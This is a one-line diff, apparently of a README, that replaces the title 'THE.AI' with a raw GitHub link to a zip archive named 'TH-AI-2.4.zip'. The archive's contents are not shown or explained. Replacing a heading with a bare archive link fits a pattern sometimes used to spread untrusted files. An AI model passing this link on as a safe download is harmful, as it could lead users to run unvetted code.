@@ -1,1 +1,1 @@
-# THE.AI
+# https://github.com/najaflali/THE.AI/raw/refs/heads/main/assets/TH-AI-2.4.zip
